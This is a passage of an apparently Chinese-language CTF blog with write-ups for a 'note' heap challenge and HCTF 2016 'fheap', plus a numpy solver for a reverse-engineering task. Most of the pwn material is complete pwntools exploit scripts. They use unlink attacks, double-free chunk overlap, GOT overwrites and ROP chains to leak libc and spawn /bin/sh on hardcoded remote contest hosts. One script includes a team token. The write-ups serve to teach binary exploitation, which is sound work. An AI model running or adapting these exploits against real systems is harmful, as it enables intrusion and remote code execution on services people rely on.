class="number">0x602018</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">0</span>, payload)</div><div class="line"></div><div class="line">Edit(p, <span class="number">2</span>, p64(system_addr))</div><div class="line"></div><div class="line">New(p, <span class="number">0x20</span>, <span class="string">'SH'</span>, <span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><code>note</code>结构体中有<code>Title</code>和<code>content</code>，特别没良心的不给<code>Show</code>功能，<br>漏洞点在<code>EditContent</code>功能一次只能修改48个字节的<code>content</code>，但是允许从<code>content</code>后部开始修改，<br>程序使用的是talloc，网上搜索了一波发现貌似还有点复杂，不过调试发现talloc的chunk只是拓展了ptmalloc的堆块结构，<br>而且释放内存实际上最终还是要执行ptmalloc的<code>free()</code>，所以完全可以当作老式的linux exploit来搞<br>利用溢出来做unlink attack，然后我们就的到了一个指向在<code>bss</code>段的<code>note list</code>的指针，修改<code>_talloc_free@got</code>为<code>puts@plt + 6</code>，这样就把<code>Delete()</code>变成了<code>Show</code><br>但这样并不能leak libc,因为在程序释放内存之前会对堆块做检查，这样就无法直接读<code>got</code>，只能leak堆上的<code>main_arena</code>指针了<br>在这之前要先得到堆地址，<code>note</code>结构体中，<code>Title</code>紧跟着<code>content_ptr</code>，把<code>Title</code>填满就可以leak heap了，<br>但是程序的<code>ChangeTitle()</code>函数读取输入的时候会在输入的末尾补<code>\x00</code>，而且非常诡异的是只要把Title填满，下一次<code>atoi()</code>函数的结果一定会为0，程序直接退出<br>后来发现<code>EditContent()</code>是不会在输入末尾补<code>\x00</code>的，然后利用之前unlink的到的指针修改note list，将其作为一个<code>note</code>结构体，<br>这样就可以用<code>EditContent()</code>的方法修改某个note的<code>Title</code>,然后打印出来就可以的到堆的地址，<br>之后要打印出堆上的<code>main_arena</code>指针，但是<code>main_arena</code>指针的位置在堆块的头部，并不在<code>Title</code>的位置，无法通过<code>Delete()</code>函数的检查，<br>所以在这之前，利用之前指向note list的指针，多次修改堆内容，将<code>main_arena</code>指针前面的内容修改成一个talloc的chunk头部，然后就可以通过检查，将<code>main_arena</code>的指针打印出来<br>然后就可以修改<code>atoi@got</code>为<code>system()</code>，输入<code>/bin/sh</code>就可以getshell了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, size, title, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the title:\n'</span>)</div><div class="line">    p.send(title)</div><div class="line">    p.recvuntil(<span class="string">'Input the size of content:\n'</span>)</div><div class="line">    p.send(str(size) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the content:\n'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(p, idx, offset, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;\n'</span>)</div><div class="line">    p.send(<span class="string">'3\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the start offset:'</span>)</div><div class="line">    p.send(str(offset) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new content:'</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeTitle</span><span class="params">(p, idx, title)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">    p.send(<span class="string">'5\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input the id of the note:'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Enter the new title:'</span>)</div><div class="line">    p.send(title)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./note')</span></div><div class="line">p = remote(<span class="string">'58.213.63.30'</span>, <span class="number">4003</span>)</div><div class="line"></div><div class="line">ptr = <span class="number">0x6020c0</span> + <span class="number">0x08</span> * <span class="number">8</span></div><div class="line">fake_fd = ptr - <span class="number">0x18</span></div><div class="line">fake_bk = fake_fd + <span class="number">0x08</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x00</span>)</div><div class="line">payload += p64(<span class="number">0x121</span>)</div><div class="line">payload += p64(fake_fd)</div><div class="line">payload += p64(fake_bk)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'Z'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'Z'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, payload + <span class="string">'\n'</span>, <span class="string">'B'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'C'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'D'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">128</span>, <span class="string">'E'</span> * <span class="number">16</span> + <span class="string">'\n'</span>, <span class="string">'F'</span> * <span class="number">64</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span></div><div class="line">payload += p64(<span class="number">0x120</span>)</div><div class="line">payload += p64(<span class="number">0xa0</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">8</span>, <span class="number">127</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">9</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p64(<span class="number">0x6020c0</span>)</div><div class="line">payload += p64(<span class="number">0x601fd8</span>)</div><div class="line">payload += p64(<span class="number">0x602048</span>)</div><div class="line">payload += p64(<span class="number">0x602008</span>)[:<span class="number">3</span>]</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">8</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">7</span>, p64(<span class="number">0x4007e6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Edit(p, <span class="number">5</span>, <span class="number">1</span>, <span class="string">'A'</span> * <span class="number">0x1f</span> + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">4</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x1f</span>)</div><div class="line">data = p.recvuntil(<span class="string">'Delete success'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">heap_addr = u64(data)</div><div class="line">log.info(<span class="string">'heap addr(): '</span> + hex(heap_addr))</div><div class="line"></div><div class="line">leak_addr = heap_addr + <span class="number">0x770</span></div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x70</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x2b0</span>) + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x00</span> )+ <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x50</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(leak_addr + <span class="number">0x990</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x40</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x000000000040117b</span>)+ p64(<span class="number">0x30</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00000000e8150c70</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(leak_addr) + p64(leak_addr - <span class="number">0x20</span>) + <span class="string">'\n'</span>)</div><div class="line">ChangeTitle(p, <span class="number">1</span>, p64(<span class="number">0x00</span>)+ p64(<span class="number">0x00</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line">p.recvuntil(<span class="string">'\x0a'</span>)</div><div class="line">data = p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</div><div class="line">main_arena = u64(data)</div><div class="line"></div><div class="line">log.info(<span class="string">"main_arena : "</span> + hex(main_arena))</div><div class="line"></div><div class="line"><span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">libc = ELF(<span class="string">'./libc-2.19.so'</span>)</div><div class="line"></div><div class="line"><span class="comment">#libc_base = main_arena - 0x398b58</span></div><div class="line">libc_base = main_arena - <span class="number">0x3BE7B8</span></div><div class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">log.info(<span class="string">"system() addr: "</span> + hex(system_addr))</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">5</span>, p64(<span class="number">0x602058</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">ChangeTitle(p, <span class="number">0</span>, p64(system_addr) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'&gt;&gt;'</span>)</div><div class="line">p.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
      
    </div>
  </div>
</article>

  
    
    
      
        </div></section>
      
      
      <section class="archives-wrap">
        <div class="archive-year">
          <a href="/archives/2016" class="archive-year">2016</a>
        </div>
        <div class="archives">
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2016-11-29
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        HCTF-2016-writeup
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="PWN-就是干"><a href="#PWN-就是干" class="headerlink" title="PWN-就是干"></a>PWN-就是干</h2><p>程序管理如下结构体  </p>
<p><img src="./HCTF-2016-writeup/pwn.jpg" alt=""><br>如果输入的<code>content</code>长度超过15，则会另外申请一块内存存放<code>content</code>,原来<code>content</code>数组的部分会用来存放<code>content</code>指针，<br>删除结构体时存在<code>double free</code>漏洞，适当构造内存申请释放的顺序就可以构造出堆块重叠，可以修改整个<code>info</code>结构体<br>因为程序开启了PIE保护，想要利用修改结构体中的函数指针来控制<code>RIP</code>前需要先leak binary，因为函数指针原先指向<br>的是0xd6c和0xd52两个地址，PIE保护下，代码地址最后三位仍然是固定的的，所以只需要将函数指针的最低字节修改为0x2d，<br>就可以将函数指针定位到<code>0xd2d</code>这个地址，这个地址的代码是<code>call puts</code>，这样删除堆块时，<code>free(content)</code>就会变成<code>puts(content)</code>，<br>适当构造content的内容就可以将函数指针的至连带输出，进而计算出程序的基址<br>因为输入选项的时候可以在栈上填充大量的数据，因此通过修改函数指针来做ROP,用puts函数来leak libc<br>通过泄露出来的__libc_start_main函数地址在libc-database找到了对应的版本，但是其他函数的地址却和找到的版本对不上，libc-db上也找不到对应版本，<br>不过运气不错，远程的libc中的system函数偏移和在libc-database中找到的相差不远，略微调整远程就返回了<code>sh not found</code>这样的错误信息，这样就确定<code>system</code>函数地址正确<br>最后要执行<code>system(&#39;/bin/sh&#39;)</code>，原本想要往内存里写个<code>/bin/sh</code>或者把某个函数的GOT写成system，但是远程ROP执行read老是挂，无奈只好去找’/bin/sh’的地址，<br>通过system函数返回的<code>sh: XX not found</code>来确定当前地址的内容，再拿本机libc作为参照，不断微调找到正确的地址成功getshell<br>exp如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(p, context, length)</span>:</span></div><div class="line">    <span class="keyword">if</span> length != <span class="number">0x1000</span>:</div><div class="line">        length = length + <span class="number">1</span></div><div class="line">        context = context + <span class="string">'\x00'</span></div><div class="line">    p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">    p.send(<span class="string">'create \n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Pls give string size:'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'str:'</span>)</div><div class="line">    p.send(context)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, id)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">    p.send(<span class="string">'delete \n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Pls give me the string id you want to delete\n'</span>)</div><div class="line">    p.send(str(id) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Are you sure?:'</span>)</div><div class="line">    p.send(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line">REMOTE = <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> REMOTE:</div><div class="line">    p = remote(<span class="string">'115.28.78.54'</span>, <span class="number">80</span>)</div><div class="line">    p.recvuntil(<span class="string">'please input you token: '</span>)</div><div class="line">    p.send(<span class="string">'HIR6yCbxwkyODNmaKToG4fANPJZnOJOBNuAf0Yio\n'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = process(<span class="string">'./fheap'</span>)</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./fheap'</span>)</div><div class="line"></div><div class="line">offset_pop4_ret = <span class="number">0x11dc</span></div><div class="line">offset_rdi_ret = <span class="number">0x11e3</span></div><div class="line">offset_mainloop = <span class="number">0xc71</span></div><div class="line">offset_rsi_r15 = <span class="number">0x11e1</span></div><div class="line"></div><div class="line">offset___libc_start_main_got = elf.got[<span class="string">'__libc_start_main'</span>]</div><div class="line">offset_atoi_got = elf.got[<span class="string">'atoi'</span>]</div><div class="line">offset_exit_got = elf.got[<span class="string">'exit'</span>]</div><div class="line">offset_puts_plt = elf.plt[<span class="string">'puts'</span>]</div><div class="line">offset_read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line"></div><div class="line"><span class="comment">#raw_input()</span></div><div class="line"></div><div class="line">Create(p, <span class="string">'A'</span> * <span class="number">0x08</span>, <span class="number">0x08</span>)</div><div class="line">Create(p, <span class="string">'B'</span> * <span class="number">0x1f</span>, <span class="number">0x1f</span>)</div><div class="line"></div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x18</span> + chr(<span class="number">0x2d</span>)</div><div class="line"></div><div class="line">Create(p, payload, len(payload))</div><div class="line"></div><div class="line">Delete(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'A'</span> * <span class="number">0x18</span>)</div><div class="line"></div><div class="line">bin_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">bin_base = bin_addr - <span class="number">0xd2d</span></div><div class="line"></div><div class="line">pop4_ret = bin_base + offset_pop4_ret</div><div class="line">rdi_ret = bin_base + offset_rdi_ret</div><div class="line">rsi_r15_ret = bin_base + offset_rsi_r15</div><div class="line">__libc_start_main_got = bin_base + offset___libc_start_main_got</div><div class="line">atoi_got = bin_base + offset_atoi_got</div><div class="line">puts_plt = bin_base + offset_puts_plt</div><div class="line">read_plt = bin_base + offset_read_plt</div><div class="line">main_loop = bin_base + offset_mainloop</div><div class="line">exit_got = bin_base + offset_exit_got</div><div class="line"></div><div class="line">log.info(<span class="string">'fheap base: '</span> + hex(bin_base))</div><div class="line"></div><div class="line">Delete(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">0x18</span> + p64(pop4_ret)</div><div class="line"></div><div class="line">Create(p, payload, <span class="number">0x1000</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'delete  '</span></div><div class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>) * <span class="number">0x38</span></div><div class="line">payload += p64(<span class="number">0xdeadc0dedeadc0de</span>)</div><div class="line">payload += p64(rdi_ret)</div><div class="line">payload += p64(__libc_start_main_got)</div><div class="line">payload += p64(puts_plt)</div><div class="line">payload += p64(main_loop)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Pls give me the string id you want to delete\n'</span>)</div><div class="line">p.send(str(<span class="number">1</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Are you sure?:'</span>)</div><div class="line">p.send(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line">__libc_start_main_addr = u64(p.recvuntil(<span class="string">'\n'</span>, drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">log.info(<span class="string">"__libc_start_main() addr: "</span> + hex(__libc_start_main_addr))</div><div class="line"></div><div class="line">offset___libc_start_main = <span class="number">0x0000000000020740</span></div><div class="line">offset_system = <span class="number">0x0000000000045380</span></div><div class="line">offset_str_bin_sh = <span class="number">0x18c58b</span></div><div class="line"></div><div class="line">libc_base = __libc_start_main_addr - offset___libc_start_main</div><div class="line"></div><div class="line">libc_base = libc_base + <span class="number">0x10</span></div><div class="line"></div><div class="line">system_addr = libc_base + offset_system</div><div class="line">binsh_addr = libc_base + offset_str_bin_sh + <span class="number">0x3a</span> - <span class="number">0x48d</span> + <span class="number">0x40</span> - <span class="number">0x11</span></div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'delete  '</span></div><div class="line">payload += p64(<span class="number">0xdeadc0dedeadc0de</span>) * <span class="number">0x41</span></div><div class="line">payload += p64(rdi_ret)</div><div class="line">payload += p64(binsh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">payload += p64(main_loop)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'3.quit\n'</span>)</div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Pls give me the string id you want to delete\n'</span>)</div><div class="line">p.send(str(<span class="number">1</span>) + <span class="string">'\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Are you sure?:'</span>)</div><div class="line">p.send(<span class="string">'yes'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="RE-前年400"><a href="#RE-前年400" class="headerlink" title="RE 前年400"></a>RE 前年400</h2><p>IDA稍微动态跟了下找到了验证函数，验证<code>if</code>里面一大串的条件，最后抠出来是一个22元一次方程组，那<code>python</code>处理下然后用<code>numpy</code>解一下，注意下浮点取整就可以了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"></div><div class="line">f = open(<span class="string">'./list.txt'</span>)</div><div class="line">matrix = []</div><div class="line">resultlist = []</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    content = f.readline()</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> content:</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    i = <span class="number">0</span></div><div class="line">    elementlist = []</div><div class="line">    <span class="keyword">while</span> i &lt; <span class="number">22</span>:</div><div class="line">        elementlist.append(<span class="number">0</span>)</div><div class="line">        i = i + <span class="number">1</span></div><div class="line">    result = int(content.split(<span class="string">'=='</span>)[<span class="number">1</span>])</div><div class="line">    tears = content.split(<span class="string">'=='</span>)[<span class="number">0</span>]</div><div class="line">    tmplist = &#123;&#125;</div><div class="line">    i = <span class="number">0</span></div><div class="line">    numlist = tears.split(<span class="string">' + '</span>)</div><div class="line">    <span class="keyword">while</span> i &lt; <span class="number">22</span>:</div><div class="line">        num = int(numlist[i].split(<span class="string">'*'</span>)[<span class="number">0</span>])</div><div class="line">        idx = numlist[i].split(<span class="string">'*'</span>)[<span class="number">1</span>][<span class="number">1</span>:]</div><div class="line">        i = i + <span class="number">1</span></div><div class="line">        tmplist[idx] = num</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> i &lt; <span class="number">22</span>:</div><div class="line">        elementlist[i] = tmplist[str(i + <span class="number">3</span>)]</div><div class="line">        i = i + <span class="number">1</span></div><div class="line">    matrix.append(elementlist)</div><div class="line">    resultlist.append(result)</div><div class="line"></div><div class="line"><span class="keyword">print</span> matrix</div><div class="line"><span class="keyword">print</span> resultlist</div><div class="line"></div><div class="line">a = np.array(matrix)</div><div class="line">b = np.array(resultlist)</div><div class="line"></div><div class="line">x = np.linalg.solve(a, b)</div><div class="line"></div><div class="line"><span class="keyword">print</span> x</div></pre></td></tr></table></figure></p>
